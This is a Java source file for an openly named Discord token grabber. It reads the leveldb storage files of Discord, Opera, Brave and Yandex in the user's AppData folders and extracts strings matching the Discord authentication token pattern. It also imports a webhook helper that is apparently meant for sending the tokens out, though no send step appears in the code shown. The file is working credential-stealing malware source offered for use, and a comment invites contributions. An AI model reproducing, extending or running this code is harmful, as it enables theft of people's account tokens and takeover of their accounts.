package me.Phoenix852.TokenGrabber2j;

import jdk.nashorn.internal.runtime.regexp.joni.Regex;
import me.Phoenix852.TokenGrabber2j.Utils.Webhook;

import java.io.*;
import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Scanner;
import java.util.regex.*;

public class Grabber {
    private final String roaming = System.getenv("APPDATA");
    private final String localappdata = System.getenv("LOCALAPPDATA");

    private final String tokenRegexPattern = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}";
    private final String emailRegexPattern = "^((\"[\\w-\\s]+\")|([\\w-]+(?:\\.[\\w-]+)*)|(\"[\\w-\\s]+\")([\\w-]+(?:\\.[\\w-]+)*))(@((?:[\\w-]+\\.)*\\w[\\w-]{0,66})\\.([a-z]{2,6}(?:\\.[a-z]{2})?)$)|(@\\[?((25[0-5]\\.|2[0-4][0-9]\\.|1[0-9]{2}\\.|[0-9]{1,2}\\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\\]?$)/i";

    private HashMap<String, String> paths = new HashMap<>();

    public Grabber() {
        paths.put("Discord", roaming + "\\Discord");
        paths.put("Discord Canary", roaming + "\\discordcanary");
        paths.put("Discord PTB", roaming + "\\discordptb");
        /* paths.put("Google Chrome", localappdata + "\\Google\\Chrome\\User Data\\Default"); */ // Comment because adding google chrome bugs idk why, if you know the reason for this bug, please make a fork of this repo, fix it and then make a pull request.
        paths.put("Opera", roaming + "\\Opera Software\\Opera Stable");
        paths.put("Brave", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
        paths.put("Yandex", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default");
    }

    public ArrayList<String> findTokens()  {
        ArrayList<String> tokens = new ArrayList<String>();

        for (
                String path : paths.values()
        ) {
            path += "\\Local Storage\\leveldb\\";

            File folder = new File(path);

            if(folder.exists()) {

                File[] files = folder.listFiles();

                for(File file:files) {
                    if(file.isFile()) {
                        if(file.getName().endsWith(".log") | file.getName().endsWith(".ldb")) {
                            Scanner scanner = null;

                            try {
                                scanner = new Scanner(new BufferedReader(new FileReader(file)));
                            } catch (FileNotFoundException e) {
                                e.printStackTrace();
                            }

                            String content = "";

                            while(scanner.hasNext()) {
                                content += scanner.next();
                            }

                            Pattern p = Pattern.compile(tokenRegexPattern);
                            Matcher m = p.matcher(content);

                            if(m.find()) {
                                String token = m.group(0);
                                tokens.add(token);
                            }
                        }
                    }
                }


            }

        }

        return tokens;
    }

}
